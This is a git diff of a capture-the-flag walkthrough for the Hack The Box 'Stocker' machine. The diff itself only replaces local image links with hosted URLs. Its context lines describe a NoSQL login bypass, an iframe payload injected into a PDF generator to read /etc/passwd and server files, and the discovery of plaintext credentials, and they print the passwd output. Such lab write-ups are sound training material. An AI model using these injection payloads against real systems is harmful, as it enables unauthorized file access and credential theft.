@@ -67,7 +67,7 @@ echo ‘10.10.11.196 stocker.htb’ | sudo tee -a /etc/hosts
 
 Naviagte to the web page 
 
-![](Stocker/image.png)
+![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/85dbd820-bc36-4457-ab47-01bcb97ee03f)
 
 Not much to go on here.
 
@@ -100,7 +100,8 @@ dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 36
 
 Ffuf found dev.stocker.htb which directs to a login page.
 
-![](Stocker/1_image.png)
+![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/cab9be53-ba08-429c-a733-0800ed9c84ef)
+
 
 Injection Attack
 ----------------
@@ -109,11 +110,13 @@ Capture the request from the blank login page with burpsute proxy using intercep
 
 Right click the request and send it to the repeater. I wasnt able to find anything in the page source indicating the backend so I tried a bunch of different injection types. I eventually found a noSQL payload here: [https://book.hacktricks.xyz/pentesting-web/nosql-injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection). Dont forget to change the Content-type field to json when using json payloads.
 
-![](Stocker/3_image.png)
+![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/02b8ba42-02b8-4be7-9825-aaab80f20a1e)
+
 
 Request the response in the browser and turn intercept off if its still enabled. We are now logged into the page and redirected to /stock which lists products that can be purchased. Add something to the cart and check out, intercept this traffic with burpsuite proxy.
 
-![](Stocker/2_image.png)
+![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/aa87ca49-0552-461a-a1b9-bdb1ee45b0f5)
+
 
 Remote File Inclusion
 ---------------------
@@ -132,7 +135,8 @@ This worked! In order to read the file increase the size of the frame.
 <iframe src=file:///etc/passwd width=100% height=1000></iframe>"
 ```
 
-![](Stocker/4_image.png)
+![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/04588c7a-2382-4378-aa10-2a1acbd9cdda)
+
 
 ```text-plain
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no login systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin landscape:x:109:116::/var/lib/landscape:/usr/sbin/nol ogin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin angoose:x:1001:1001:,,,:/home/angoose:/bin/bash _laurel:x:998:998::/var/log/laurel:/bin/false
@@ -140,13 +144,15 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 
 Next look for the nginx config file in the standard location /etc/nginx/nginx.conf
 
-![](Stocker/5_image.png)
+![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/c1ff2d78-6389-4857-841b-05c5ec1ddb2c)
+
 
 It looks like the dev vhost is being run from /var/www/dev. I had to adjust the height a few times to get as much as I could onto the page, the pdf would not render if the iframe extended past the pagebreak.
 
 Next I tried some common filenames that might exist in a nodejs directory. index.js was the first one that worked. lets check out /var/www/dev/index.js in the iframe.
 
-![](Stocker/6_image.png)
+![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/72be8454-932a-4df1-bcdf-9e58c3d72285)
+
 
 Looks like there's some plaintext creds in this file.
 
